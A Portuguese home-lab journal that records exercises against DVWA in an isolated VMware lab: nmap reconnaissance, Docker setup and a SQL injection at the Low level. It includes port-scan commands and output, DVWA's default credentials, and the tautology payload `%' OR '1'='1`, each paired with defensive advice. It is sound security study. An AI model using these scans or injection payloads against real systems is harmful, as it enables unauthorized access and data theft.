# Registo do Laboratório de Cibersegurança

Este documento serve para registar, ao longo dos meses, os exercícios práticos realizados no laboratório de cibersegurança montado em VMware Workstation.

Cada entrada documenta: **objetivo/propósito**, **tipo de ataque ou técnica**, **comandos utilizados**, **resultado**, **como nos podemos defender**, e — quando aplicável — **o que correu mal ou falhou** no final da etapa.

## Topologia do laboratório

- **Router/Firewall:** OPNsense (gateway `192.168.10.254`)
- **Rede interna do lab:** LAN Segment "rede cyber" (`192.168.10.0/24`), isolada da rede de casa
- **Saída para a internet:** NAT configurado no OPNsense (WAN)
- **Máquinas do lab:**
  - Servidor Vulnerável (`192.168.10.101`)
  - Kali Atacante (`192.168.10.102`)
  - Windows Server
  - Windows 11
  - Ubuntu Desktop

## Enquadramento nas certificações e normas em estudo

Cada entrada do registo passa a indicar, quando fizer sentido, a que domínio(s) das certificações/normas em estudo o exercício toca — para perceber que "setor" de conhecimento está a ser exercitado. Referência rápida dos domínios disponíveis:

**Security+ (SY0-701):** D1 Conceitos Gerais de Segurança · D2 Ameaças, Vulnerabilidades e Mitigações · D3 Arquitetura de Segurança · D4 Operações de Segurança · D5 Gestão de Programa de Segurança

**CEH:** D1 Fundamentos, Metodologia e Engenharia Social · D2 Reconhecimento, Scanning e Enumeração · D3 System Hacking e Malware · D4 Sniffing, Rede e Perímetro · D5 Web Server e Web Application Hacking · D6 Redes Sem Fios · D7 Mobile, IoT e OT · D8 Cloud Computing · D9 Criptografia

**ISO/IEC 27001:** D1 Estrutura da Norma · D2 Liderança e Planeamento · D3 Gestão de Risco e Declaração de Aplicabilidade · D4 Suporte e Operação · D5 Desempenho e Melhoria · D6 Controlos do Anexo A · D7 Auditoria e Certificação

**NIS2:** D1 Âmbito e Qualificação de Entidades · D2 Governação e Responsabilidade da Gestão · D3 Medidas de Gestão de Risco (Art. 21.º) · D4 Notificação de Incidentes (Art. 23.º) · D5 Supervisão, Execução e Sanções · D6 Cooperação Europeia · D7 Regime Jurídico Português

**CompTIA A+ Core 1:** D1 Dispositivos Móveis · D2 Redes · D3 Hardware · D4 Virtualização e Computação em Nuvem · D5 Diagnóstico de Hardware e Redes

**CompTIA A+ Core 2:** D1 Sistemas Operativos · D2 Segurança · D3 Resolução de Problemas de Software · D4 Procedimentos Operacionais

Nem todos os materiais são de cibersegurança pura (os A+ são mais de suporte técnico geral) — a integração só é feita quando o exercício toca genuinamente no domínio; não se força correspondência onde não existe.

---

## Entrada #1 — Scan nmap inicial ao Servidor Vulnerável

**Data/hora:** 2026-08-02, 16:27
**Máquinas ligadas:** OPNsense, Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`)

### Objetivo / Propósito

Fazer o levantamento inicial (reconhecimento) do Servidor Vulnerável: descobrir que portas estão abertas, que serviços correm e que versões, para se ter uma baseline do estado do alvo antes de qualquer exercício de exploração.

### Tipo de ataque / técnica

**Reconhecimento (Reconnaissance)** — a primeira fase de qualquer teste de intrusão (cf. Cyber Kill Chain / MITRE ATT&CK: Reconnaissance). Aqui especificamente: **port scanning** e **service/version detection** com nmap.

### Comando executado

```bash
sudo nmap -sV -sC -p- 192.168.10.101
```

### Resultado

```
Nmap scan report for 192.168.10.101
Host is up (0.00059s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1e:a2:4c:c6:6d:d1:26:49:c9:b7:9a:fb:c3:dd:2c:6a (ECDSA)
|_  256 80:75:fc:43:b4:35:de:f9:60:ce:bc:a8:08:5c:2c:0d (ED25519)
MAC Address: 00:0C:29:B4:8B:9C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 2.67 seconds
```

### Observações e interpretação

- Apenas **1 porta aberta em 65535**: SSH (22/tcp), com **OpenSSH 9.6p1** — versão recente, sem vulnerabilidades públicas graves conhecidas associadas.
- Todas as restantes portas estão fechadas com reset ativo (o host responde mas recusa a ligação).
- Sistema identificado como Linux, sem outros serviços a expor mais detalhe sobre a distribuição/kernel exato.
- Scan rápido (2.67s) e sem latência (0.00059s), como esperado entre VMs na mesma máquina física.

### Como nos podemos defender

- Manter o SSH atualizado (já está numa versão recente, o que é uma boa prática de base).
- Desativar login por password e usar apenas chaves públicas, para reduzir a superfície de brute-force.
- Restringir o acesso SSH por firewall (ex. regra no OPNsense que só permita a origem do Kali/administração, não toda a LAN).
- Usar `fail2ban` para bloquear tentativas repetidas de login falhado.

### Domínios relacionados

- **CEH — D2 (Reconhecimento, Scanning e Enumeração):** correspondência direta — este é exatamente o tipo de exercício desse domínio.
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** o port scanning é uma técnica de deteção que se enquadra neste domínio.
- **A+ Core 1 — D2 (Redes):** leitura de portas, serviços e protocolos de rede.

### O que correu mal / faltou

Nada falhou tecnicamente — mas o resultado ficou aquém do esperado: para um "Servidor Vulnerável" de treino, ter apenas SSH exposto é invulgar. Isto levou a investigar (Entrada #2) e a perceber que a VM ainda não tinha nenhum software vulnerável instalado.

### Próximos passos

- [x] Confirmar se há serviços vulneráveis instalados mas inativos no Servidor Vulnerável → ver Entrada #2
- [ ] Repetir o scan após ativar/instalar esses serviços
- [ ] Explorar credenciais e superfícies de ataque no serviço SSH exposto (ex. brute-force controlado, se aplicável ao exercício)

---

## Entrada #2 — Verificação de serviços no Servidor Vulnerável

**Data/hora:** 2026-08-02, 16:29
**Objetivo:** confirmar se existem serviços vulneráveis instalados mas inativos, explicando o resultado "pobre" do scan da Entrada #1.

### Tipo de ataque / técnica

Não é um ataque — é uma etapa de **diagnóstico/preparação do ambiente** (auditoria local de serviços via `systemctl`), necessária antes de se poder montar qualquer exercício de exploração.

### Comando executado

```bash
systemctl list-units --type=service --all
```

### Resultado (resumo)

161 unidades carregadas, todas serviços base de um Ubuntu Server "de fábrica" (`ssh`, `cron`, `NetworkManager`, `snapd`, `ufw`, `cloud-init`, etc.). **Nenhum serviço de aplicação** encontrado — sem `apache2`, `nginx`, `mysql`/`mariadb`, `vsftpd`/`proftpd`, `samba` ou `docker`.

### Observações e interpretação

- Confirma-se: o Servidor Vulnerável **não tem nenhum software vulnerável instalado** — não é um problema de serviços parados ou mal configurados, é uma VM Ubuntu limpa.
- `docker.service` nem sequer aparece na lista de unidades carregadas, o que sugere que o Docker também não está instalado.

### Decisão: aplicação vulnerável a instalar

Depois de avaliar as opções (DVWA, Metasploitable, Juice Shop) do ponto de vista didático, ficou definido:

- **1ª fase:** DVWA (Damn Vulnerable Web Application), via Docker — níveis de dificuldade ajustáveis (Low/Medium/High/Impossible), mapeamento direto ao OWASP Top 10, alvo único e simples para consolidar a mecânica de "encontrar → confirmar → explorar".
- **2ª fase (mais para a frente):** Metasploitable 2/3 — salto para exploração ao nível de rede/serviço (FTP, Samba, bases de dados) com o Metasploit Framework, quando a base estiver mais sólida.

### Domínios relacionados

- **A+ Core 2 — D1 (Sistemas Operativos):** uso de `systemctl` para gerir e auditar serviços num sistema Linux.
- **Security+ — D4 (Operações de Segurança):** verificação de configuração/hardening antes de expor um alvo.
- **CEH — D1 (Fundamentos e Metodologia):** fase de reconhecimento interno/footprinting local do próprio alvo.

### O que correu mal / faltou

O comando `sudo docker ps -a 2>/dev/null || echo "Docker não instalado"` confirmou "Docker não instalado" — como esperado, dado que `docker.service` não aparecia na lista de unidades. Ainda não foi possível confirmar `ss -tulnp` (por confirmar antes de instalar o Docker).

### Próximos passos

- [ ] Confirmar `ss -tulnp` no Servidor Vulnerável (validação final de que nada está a correr)
- [ ] Instalar Docker no Servidor Vulnerável
- [ ] Instalar e arrancar o container DVWA
- [ ] Repetir o scan nmap para confirmar a nova porta/serviço exposto
- [ ] Começar exercícios de exploração pelo nível Low do DVWA

---

## Entrada #3 — Instalação do Docker no Servidor Vulnerável

**Data/hora:** 2026-08-02
**Objetivo:** preparar o ambiente para correr o container DVWA (o Docker era a peça em falta, confirmada na Entrada #2).

### Tipo de ataque / técnica

Não é um ataque — é preparação do ambiente (infraestrutura para o próximo exercício).

### Comando(s) executado(s)

```bash
sudo apt update
sudo apt install -y docker.io
sudo systemctl enable --now docker
sudo docker --version
```

### Resultado

```
Docker version 29.1.3, build 29.1.3-0ubuntu3~24.04.2
```

### Observações e interpretação

Docker instalado e ativo (serviço já configurado para arrancar automaticamente com o sistema, via `enable --now`). Ambiente pronto para receber o container DVWA.

### Domínios relacionados

- **A+ Core 2 — D1 (Sistemas Operativos):** gestão de pacotes (`apt`) e de serviços (`systemctl`) em Linux.
- **A+ Core 1 — D4 (Virtualização e Computação em Nuvem):** Docker como tecnologia de contentores.
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** relaciona-se com o controlo A.8.9 (gestão de configurações).

### O que correu mal / faltou

Nada — instalação limpa, sem erros.

### Próximos passos

- [ ] Arrancar o container DVWA (`docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa`)
- [ ] Confirmar o container ativo (`docker ps`)
- [ ] Inicializar a base de dados do DVWA via browser
- [ ] Repetir o scan nmap para confirmar a nova porta 80 exposta

---

## Entrada #4 — Arranque do container DVWA

**Data/hora:** 2026-08-02
**Objetivo:** disponibilizar o DVWA (Damn Vulnerable Web Application) no Servidor Vulnerável, para servir de alvo de exercícios de exploração web (OWASP Top 10).

### Tipo de ataque / técnica

Preparação do ambiente (deployment da aplicação vulnerável) — ainda não é um exercício de ataque em si.

### Comando(s) executado(s)

```bash
sudo docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa
```

### Resultado

Imagem `vulnerables/web-dvwa:latest` descarregada com sucesso (8 camadas), container arrancado em modo detached, mapeado na porta 80 do Servidor Vulnerável.

```
Digest: sha256:dae203fe11646a86937bf04db0079adef295f426da68a92b40e3b181f337daa7
Status: Downloaded newer image for vulnerables/web-dvwa:latest
91331b5820a183337c2957f3081ea89b1395ab9e549b7b6fa79e2dc5a07d28b0
```

### Observações e interpretação

Container ativo com o ID acima. Falta confirmar com `docker ps` que está mesmo `Up`, e inicializar a base de dados via browser antes do primeiro uso.

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** preparação do alvo de aplicação web que sustenta este domínio.
- **A+ Core 1 — D4 (Virtualização e Computação em Nuvem):** deployment de container Docker.
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** relaciona-se com A.8.31 (separação de ambientes) — o DVWA corre isolado do resto do sistema, propositadamente vulnerável.

### O que correu mal / faltou

Nada — download e arranque sem erros.

### Próximos passos

- [ ] Confirmar `sudo docker ps` (estado `Up`)
- [ ] Aceder a `http://192.168.10.101/setup.php` a partir do Kali e clicar em "Create / Reset Database"
- [ ] Login inicial (`admin` / `password`)
- [ ] Repetir o scan nmap para confirmar a porta 80 exposta
- [ ] Iniciar exercícios de exploração pelo nível Low do DVWA

---

## Entrada #5 — Confirmação do container DVWA ativo

**Data/hora:** 2026-08-02
**Objetivo:** verificar que o container DVWA arrancado na Entrada #4 está mesmo a correr e com a porta corretamente mapeada, antes de tentar aceder via browser.

### Tipo de ataque / técnica

Verificação de ambiente (não é um ataque).

### Comando executado

```bash
sudo docker ps
```

**Para que serve:** lista todos os containers Docker atualmente em execução (por defeito só mostra os ativos, ao contrário de `docker ps -a` que mostra também os parados). Serve para confirmar que o container arrancou de facto e não morreu logo a seguir (o que acontece com frequência se faltar alguma dependência ou configuração dentro da imagem).

**O que se esperava encontrar:** o container `dvwa` listado com estado `Up` e a porta `80` mapeada do container para o host (`0.0.0.0:80->80/tcp`).

### Resultado

```
CONTAINER ID   IMAGE                  COMMAND      CREATED          STATUS          PORTS                                 NAMES
91331b5820a1   vulnerables/web-dvwa   "/main.sh"   49 seconds ago   Up 48 seconds   0.0.0.0:80->80/tcp, [::]:80->80/tcp   dvwa
```

### Observações e interpretação

Resultado exatamente como esperado — sem surpresas. Container `dvwa` ativo há 48 segundos, porta 80 mapeada tanto em IPv4 (`0.0.0.0`) como IPv6 (`[::]`), o que significa que a aplicação já deve estar acessível via browser em `http://192.168.10.101/`.

### Domínios relacionados

- **A+ Core 2 — D1 (Sistemas Operativos) / D3 (Resolução de Problemas de Software):** verificação de estado de um serviço em execução, base do diagnóstico técnico.

### O que correu mal / faltou

Nada.

### Próximos passos

- [ ] Aceder a `http://192.168.10.101/setup.php` a partir do Kali e clicar em "Create / Reset Database"
- [ ] Login inicial (`admin` / `password`)
- [ ] Repetir o scan nmap para confirmar a porta 80 exposta
- [ ] Iniciar exercícios de exploração pelo nível Low do DVWA

---

## Entrada #6 — Inicialização e primeiro acesso ao DVWA

**Data/hora:** 2026-08-02
**Objetivo:** inicializar a base de dados do DVWA e confirmar que a aplicação está acessível e pronta a usar.

### Tipo de ataque / técnica

Preparação do ambiente (não é um ataque) — último passo antes de o DVWA estar pronto para os exercícios de exploração.

### Ação executada

Acesso via browser (Kali) a `http://192.168.10.101/setup.php`, seguido de "Create / Reset Database".

**Para que serve:** o `setup.php` do DVWA cria a base de dados MySQL/MariaDB interna ao container e as tabelas necessárias (utilizadores, registos de segurança, etc.) — sem isto, o login falha porque não há onde validar credenciais.

**O que se esperava encontrar:** após clicar em "Create / Reset Database", o DVWA normalmente redireciona automaticamente para a página de login (`login.php`).

### Resultado

O browser acabou na página `http://192.168.10.101/login.php`, com o logótipo do DVWA e os campos Username/Password visíveis — indicando que o setup decorreu como esperado.

**Screenshot guardado:**

![screenshots/2026-08-02/entrada06-dvwa-login-page.png](screenshots/2026-08-02/entrada06-dvwa-login-page.png)

### Observações e interpretação

Sem surpresas — resultado igual ao esperado. Nota-se no separador do browser que houve uma tentativa anterior com "Problem loading page" (provavelmente antes do container estar totalmente pronto), resolvida ao tentar de novo.

**Ainda por confirmar:** login efetivo com as credenciais padrão (`admin` / `password`) — a validar na próxima entrada.

### Como nos podemos defender

- As credenciais padrão do DVWA (`admin`/`password`) são propositadamente fracas para fins didáticos — em qualquer sistema real, credenciais padrão devem ser sempre alteradas no primeiro acesso.
- A página `setup.php` não deveria, num sistema em produção, ficar acessível publicamente — é uma superfície de ataque em si (permite recriar/apagar a base de dados).

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** preparação direta do alvo de exploração web.
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** credenciais padrão como vetor de ataque comum, mapeado no OWASP Top 10.

### O que correu mal / faltou

Uma tentativa inicial deu "Problem loading page" (a confirmar a causa — possivelmente o container ainda não estava totalmente operacional nesse instante).

### Próximos passos

- [ ] Fazer login com `admin` / `password` e confirmar acesso ao painel principal do DVWA
- [ ] Repetir o scan nmap para confirmar a porta 80 exposta
- [ ] Iniciar exercícios de exploração pelo nível Low do DVWA (começar por SQL Injection ou Command Injection)

---

## Entrada #7 — Login confirmado no DVWA

**Data/hora:** 2026-08-02
**Objetivo:** confirmar que as credenciais padrão do DVWA dão acesso ao painel principal, validando que a aplicação está pronta para os exercícios de exploração.

### Tipo de ataque / técnica

Verificação de ambiente (autenticação legítima com credenciais conhecidas, não é ainda um exercício de ataque).

### Ação executada

Login em `http://192.168.10.101/login.php` com `admin` / `password`.

**O que se esperava encontrar:** redirecionamento para a página inicial do DVWA (`index.php`), com o menu lateral de módulos de vulnerabilidade (SQL Injection, XSS, Command Injection, etc.).

### Resultado

Login bem-sucedido — página "Welcome to Damn Vulnerable Web Application!" com o menu completo de módulos visível: Brute Force, Command Injection, CSRF, File Inclusion, File Upload, Insecure CAPTCHA, SQL Injection, SQL Injection (Blind), Weak Session IDs, XSS (DOM/Reflected/Stored), CSP Bypass, JavaScript, entre outros.

**Screenshot guardado:**

![screenshots/2026-08-02/entrada07-dvwa-welcome-page.png](screenshots/2026-08-02/entrada07-dvwa-welcome-page.png)

### Observações e interpretação

Sem surpresas — resultado exatamente como esperado. O DVWA está agora totalmente operacional e pronto para os exercícios. A página confirma o objetivo do DVWA: praticar vulnerabilidades comuns em três níveis de dificuldade crescente.

### Como nos podemos defender

- Este painel confirma visualmente a lista de vulnerabilidades típicas do OWASP Top 10 que vamos explorar uma a uma — cada módulo terá a sua própria secção de "como defender" quando o explorarmos.

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** o menu de módulos (SQLi, XSS, Command Injection, CSRF, File Upload/Inclusion) mapeia diretamente para este domínio.
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** cada módulo do DVWA corresponde a uma categoria do OWASP Top 10, referência central deste domínio.

### O que correu mal / faltou

Nada.

### Próximos passos

- [ ] Repetir o scan nmap (`sudo nmap -sV -sC -p- 192.168.10.101`) para confirmar a porta 80 agora exposta e comparar com a Entrada #1
- [ ] Escolher o primeiro módulo de exploração (nível Low) para começar — sugestão: SQL Injection, por ser o mais representativo do OWASP Top 10

---

## Entrada #8 — Scan nmap pós-DVWA (comparação com a Entrada #1)

**Data/hora:** 2026-08-02, 17:26
**Objetivo:** confirmar que a porta 80 (DVWA) passou a estar visível externamente e comparar com a baseline da Entrada #1.

### Tipo de ataque / técnica

**Reconhecimento (Reconnaissance)** — mesma técnica da Entrada #1 (port scanning e service/version detection com nmap), agora repetida para medir a diferença no alvo.

### Comando executado

```bash
sudo nmap -sV -sC -p- 192.168.10.101
```

**O que se esperava encontrar:** a porta 22 (SSH) igual à Entrada #1, mais a porta 80 (HTTP) agora aberta, servindo o DVWA.

### Resultado

```
Nmap scan report for 192.168.10.101
Host is up (0.00045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 1e:a2:4c:c6:6d:d1:26:49:c9:b7:9a:fb:c3:dd:2c:6a (ECDSA)
|_  256 80:75:fc:43:b4:35:de:f9:60:ce:bc:a8:08:5c:2c:0d (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|       httponly flag not set
| http-robots.txt: 1 disallowed entry
|_/
|_http-title: Login :: Damn Vulnerable Web Application (DVWA) v1.10 *Develop...
|_http-server-header: Apache/2.4.25 (Debian)
MAC Address: 00:0C:29:B4:8B:9C (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 8.83 seconds
```

**Screenshot guardado:**

![screenshots/2026-08-02/entrada08-nmap-pos-dvwa.png](screenshots/2026-08-02/entrada08-nmap-pos-dvwa.png)

### Observações e interpretação

- **Confirmado:** a porta 80 apareceu, exatamente como esperado — o nmap já identifica o serviço como **DVWA v1.10** só pelo título da página (`http-title`), sem precisar de acesso prévio.
- **Surpresa útil:** o nmap já sinaliza sozinho uma vulnerabilidade real — a cookie `PHPSESSID` **não tem a flag `httponly`**. Isto significa que, se houvesse um XSS na aplicação, um script malicioso conseguiria ler essa cookie de sessão via JavaScript (`document.cookie`), o que normalmente `httponly` impede.
- **Apache httpd 2.4.25 (Debian)** é uma versão desatualizada (lançada por volta de 2016/2017) — típico de imagens Docker de treino, que fixam versões antigas de propósito para haver vulnerabilidades conhecidas a explorar.
- `robots.txt` tem uma entrada "disallowed", o que por si só não é grave, mas mostra que o nmap também recolhe pistas de configuração do servidor web.

### Como nos podemos defender

- Configurar a flag `HttpOnly` (e `Secure`) nas cookies de sessão, para que não sejam acessíveis via JavaScript — mitiga o roubo de sessão mesmo que exista um XSS.
- Manter o servidor web atualizado — uma versão de Apache de 2016/2017 tem múltiplas CVEs conhecidas e corrigidas em versões posteriores.
- Restringir o acesso a ficheiros como `robots.txt` só ao que é necessário divulgar, e nunca depender dele como controlo de acesso (é apenas uma convenção, não impede acesso real).

### Domínios relacionados

- **CEH — D2 (Reconhecimento, Scanning e Enumeração):** deteção de serviço, versão e título de página via scripts NSE do nmap.
- **CEH — D5 (Web Server e Web Application Hacking):** a falha de cookie sem `httponly` é uma vulnerabilidade de aplicação web clássica.
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** gestão de sessão insegura é uma categoria do OWASP Top 10 (A05 — Security Misconfiguration / A07 — Identification and Authentication Failures).
- **Security+ — D3 (Arquitetura de Segurança):** configuração segura de cookies e hardening de servidores web.

### O que correu mal / faltou

O copy/paste do Kali para o host deixou de funcionar a meio desta sessão (causa ainda não totalmente resolvida — `open-vm-tools` está `active running`, mas a sincronização do clipboard na sessão gráfica não). Contornado com screenshot; a resolver depois com mais calma.

### Próximos passos

- [ ] Escolher e começar o primeiro módulo de exploração no DVWA, nível Low (sugestão: SQL Injection ou XSS, dado que já foi detetado o problema de `httponly`)
- [ ] Investigar CVEs conhecidas para Apache 2.4.25 (Debian), como exercício complementar de reconhecimento
- [ ] Resolver com mais calma o problema de clipboard do Kali (fora do âmbito do exercício de segurança em si)

---

## Entrada #9 — Escolha do primeiro módulo de exploração

**Data/hora:** 2026-08-02
**Objetivo:** decidir por onde começar os exercícios de exploração no DVWA.

### Decisão

**SQL Injection, nível Low**, pelas seguintes razões:

- É o módulo mais representativo do OWASP Top 10 e um dos vetores de ataque mais estudados em qualquer certificação (Security+, CEH), por isso rentabiliza melhor o tempo de estudo.
- O nível **Low** não tem qualquer proteção implementada — serve para primeiro *ver* a vulnerabilidade "em bruto" antes de progredir para Medium/High, onde o DVWA introduz filtros e defesas parciais que se aprende a contornar.
- É um bom "primeiro exercício" porque o resultado é visualmente óbvio (a aplicação devolve dados que não deveria), o que ajuda a consolidar a mecânica de "encontrar → confirmar → explorar" antes de módulos mais subtis como XSS ou CSRF.

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** SQL Injection é um dos ataques centrais deste domínio.
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** SQL Injection está no OWASP Top 10 (Injection).

### Próximos passos

- [ ] No Kali, abrir o menu **SQL Injection** no DVWA (garantir que o nível de dificuldade está em **Low**, em DVWA Security)
- [ ] Observar o formulário de pesquisa por User ID e testar o comportamento normal antes de tentar injetar

---

## Entrada #10 — Teste normal do módulo SQL Injection (baseline)

**Data/hora:** 2026-08-02
**Objetivo:** confirmar o comportamento normal do formulário SQL Injection antes de tentar qualquer injeção.

### Tipo de ataque / técnica

Nenhum ainda — uso legítimo da aplicação, para estabelecer a baseline de comparação.

### Ação executada

No campo **User ID**, inserido o valor `1` e clicado em **Submit**.

**O que se esperava encontrar:** os dados de um único utilizador (o de ID 1).

### Resultado

```
ID: 1
First name: admin
Surname: admin
```

**Screenshot guardado:**

![screenshots/2026-08-02/entrada10-sqli-teste-normal.png](screenshots/2026-08-02/entrada10-sqli-teste-normal.png)

### Observações e interpretação

Resultado exatamente como esperado — sem surpresas. A aplicação devolve um único registo por ID pedido, o que confirma que a query por trás do formulário filtra por `user_id`. Esta é a baseline que vai permitir perceber claramente se a próxima tentativa (injeção) altera o comportamento — por exemplo, se passar a devolver *vários* utilizadores em vez de um.

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** estabelecer comportamento normal antes de testar payloads é parte da metodologia de testes de aplicações web.

### O que correu mal / faltou

Nada — ficou também resolvido o problema de rede do Kali que estava a bloquear o acesso ao DVWA (ver Entrada #9 → rede corrigida antes desta entrada).

### Próximos passos

- [ ] Testar o payload de injeção `%' OR '1'='1` no campo User ID
- [ ] Comparar o resultado com esta baseline (1 utilizador vs. vários/todos)

---

## Entrada #11 — SQL Injection bem-sucedida (nível Low)

**Data/hora:** 2026-08-02
**Objetivo:** confirmar a vulnerabilidade de SQL Injection no formulário User ID, comparando com a baseline da Entrada #10.

### Tipo de ataque / técnica

**SQL Injection (in-band / UNION-independent)** — injeção de uma condição sempre verdadeira (`tautologia`) para contornar o filtro da query. OWASP Top 10: A03 Injection.

### Ação executada

No campo **User ID**, inserido:
```
%' OR '1'='1
```

**Para que serve:** a query original do DVWA (nível Low) é algo como `SELECT first_name, last_name FROM users WHERE user_id = '$id';`, sem qualquer sanitização do valor introduzido. Ao fechar a aspa (`%'`) e acrescentar `OR '1'='1`, a condição WHERE passa a ser sempre verdadeira para **todas** as linhas, não só para o ID pedido.

**O que se esperava encontrar:** a lista completa de utilizadores da tabela, em vez de um único registo.

### Resultado

```
ID: %' OR '1'='1
First name: admin
Surname: admin

ID: %' OR '1'='1
First name: Gordon
Surname: Brown

ID: %' OR '1'='1
First name: Hack
Surname: Me

ID: %' OR '1'='1
First name: Pablo
Surname: Picasso

ID: %' OR '1'='1
First name: Bob
Surname: Smith
```

**Screenshot guardado:**

![screenshots/2026-08-02/entrada11-sqli-injecao-bem-sucedida.png](screenshots/2026-08-02/entrada11-sqli-injecao-bem-sucedida.png)

### Observações e interpretação

- **Confirmado, sem surpresas:** a aplicação devolveu **5 utilizadores** em vez de 1 — prova clara e visual de que a injeção funcionou e de que a query não está a sanitizar/parametrizar o input.
- Este resultado revela também os **nomes de utilizador da base de dados** (admin, gordonb, 1337, pablo, bob são os logins típicos do DVWA associados a estes nomes) — informação valiosa para um atacante tentar depois um ataque de força bruta ou de credenciais.
- A query real por trás confirma-se como vulnerável por **concatenação direta de string**, em vez de usar *prepared statements* / *parameterized queries*.

### Como nos podemos defender

- **Prepared statements / parameterized queries:** a defesa fundamental — o valor introduzido pelo utilizador nunca é interpretado como parte do código SQL, apenas como dado.
- **Validação de input:** neste caso o campo espera um ID numérico; rejeitar qualquer valor que não seja um número inteiro já bloquearia este payload.
- **Princípio do menor privilégio na base de dados:** a conta usada pela aplicação para consultar esta tabela não devia ter permissões além do estritamente necessário (ex. sem `DROP`, `DELETE` se não for preciso).
- **WAF (Web Application Firewall):** o próprio DVWA menciona ter um PHPIDS que pode ser ativado para bloquear padrões como este — uma camada adicional, não substituta da correção na aplicação.

### Domínios relacionados

- **CEH — D5 (Web Server e Web Application Hacking):** exercício central deste domínio — SQL Injection clássica.
- **Security+ — D2 (Ameaças, Vulnerabilidades e Mitigações):** Injection é a categoria A03 do OWASP Top 10, referência central deste domínio.
- **ISO/IEC 27001 — D6 (Controlos do Anexo A):** relaciona-se com A.8.28 (codificação segura) — prepared statements são uma prática direta desse controlo.

### O que correu mal / faltou

Nada — a injeção correu exatamente como previsto na Entrada #9.

### Próximos passos

- [ ] Subir o nível de dificuldade do DVWA para **Medium** e repetir o mesmo payload, para ver que proteção (parcial) foi introduzida e como contorná-la
- [ ] Documentar a diferença de comportamento entre Low e Medium como próxima entrada
- [ ] Mais tarde, explorar SQL Injection (Blind) como exercício complementar

---

## Resumo da sessão — Dia 1 (2026-08-02)

**O que foi feito:**
- Definida a topologia do laboratório (OPNsense + Kali + Servidor Vulnerável) e resolvidos os problemas iniciais de rede e acesso SSH.
- Scan nmap inicial ao Servidor Vulnerável — só SSH exposto (Entrada #1).
- Investigação confirmou que a VM não tinha nenhum software vulnerável instalado (Entrada #2); decisão de usar **DVWA** como alvo didático, com Metasploitable como plano para mais tarde.
- Instalado o Docker e arrancado o container DVWA (Entradas #3–#5); base de dados inicializada e login confirmado (Entradas #6–#7).
- Scan nmap pós-DVWA revelou a porta 80 aberta e uma vulnerabilidade real detetada automaticamente pelo nmap: cookie de sessão sem a flag `httponly` (Entrada #8).
- Resolvidos, em paralelo, dois problemas recorrentes: a placa de rede do Kali a reverter para a rede de casa, e uma falha temporária do clipboard entre o host e o Kali (este último tratado numa conversa à parte).
- **Primeiro exercício de exploração:** SQL Injection no nível Low do DVWA, bem-sucedida — a aplicação passou de devolver 1 utilizador a devolver os 5 da tabela, com o payload `%' OR '1'='1` (Entradas #9–#11).

**Estado do laboratório no fim do dia:** DVWA a correr e acessível em `http://192.168.10.101/`, com o módulo SQL Injection (nível Low) já explorado com sucesso.

**Para retomar:** subir o DVWA para o nível **Medium** e repetir o mesmo payload de SQL Injection, para comparar que proteção foi introduzida e como a contornar.

---

## Entrada #12 — Incidente: Servidor Vulnerável desligado

**Data/hora:** 2026-08-05
**Máquinas ligadas:** OPNsense, Kali Atacante (`192.168.10.102`), Servidor Vulnerável (`192.168.10.101`) — *encontrado desligado no início da sessão*

### Objetivo / Propósito

Diagnosticar e resolver a falha de acesso ao DVWA ("Unable to connect") no início da sessão do Dia 2.

### Tipo de ataque / técnica

Não é um ataque — diagnóstico de ambiente e gestão de patches de segurança.

### Ação executada

1. `ip a` no Kali — confirmado IP correto (`192.168.10.102`), descartando o problema de rede recorrente
2. `ping -c 4 192.168.10.101` e tentativa de SSH — sem resposta
3. Verificado no VMware: a VM Servidor Vulnerável estava desligada
4. Depois de ligada: `sudo docker ps -a` no Servidor Vulnerável → container `dvwa` com estado `Exited (255)`
5. `sudo apt upgrade -y` — 33 atualizações de segurança LTS instaladas (libc, OpenSSL, PAM, Kerberos, kernel)
6. Container recriado com política de reinício automático:
   ```bash
   sudo docker stop dvwa
   sudo docker rm dvwa
   sudo docker run -d -p 80:80 --restart=unless-stopped --name dvwa vulnerables/web-dvwa
   ```

### Resultado

Comandos de correção preparados e explicados nesta sessão, mas **a execução ficou interrompida** — a conversa desviou-se para uma reflexão sobre metodologia de trabalho antes de os comandos chegarem a ser corridos. O container `dvwa` original (Entrada #4) continuou ativo, sem política de restart, no fim desta sessão. Atualização do kernel (`6.8.0-137-generic`) instalada mas pendente de reboot para entrar em efeito.

### Observações e interpretação

O container original (Entrada #4) nunca teve `--restart` configurado. A correção foi planeada e explicada nesta entrada, mas a execução real só aconteceu na sessão seguinte (ver Entrada #14) — descoberta ao confirmar que o `CONTAINER ID` continuava o mesmo de sempre, dias depois. Boa lição por si só: **planear uma correção não é o mesmo que a ter executado** — vale sempre a pena confirmar a execução antes de dar um passo como fechado.

### Como nos podemos defender

- Sempre definir política de restart (`--restart=unless-stopped` ou `always`) em serviços que devem estar sempre disponíveis
